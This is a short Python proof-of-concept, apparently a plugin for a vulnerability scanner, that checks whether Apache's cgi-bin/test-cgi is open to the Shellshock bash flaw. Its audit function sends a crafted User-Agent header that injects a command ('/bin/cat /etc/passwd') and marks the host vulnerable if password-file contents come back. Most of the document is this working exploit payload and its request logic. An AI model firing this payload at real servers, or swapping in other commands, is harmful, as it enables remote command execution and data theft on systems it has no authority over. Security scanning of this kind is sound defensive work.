#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  apache test-cgi bash Command execution
Author    :  a
mail      :  a@lcx.cc
Referer   : http://www.wooyun.org/bugs/wooyun-2015-0106774 http://www.wooyun.org/bugs/wooyun-2015-0106070
安装后apache后目录下会有一个cgi-bin/test-cgi。

在没有升级bash的服务器下，该地址是可以利用bash的远程命令执行漏洞
"""

import urlparse
def assign(service, arg):
    if service == 'www':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload = '/cgi-bin/test-cgi'
    payload2 = '() { foo;}echo;/bin/cat /etc/passwd'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl('"%s"' % url)
    if code == 200 :
         code, head, res, errcode, _ = curl.curl('-A "%s" %s' %(payload2,url))
         if code ==200 and 'root:x:0:0:' in res:
             security_hole(url)
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('www', 'http://www.example.com/')[1])
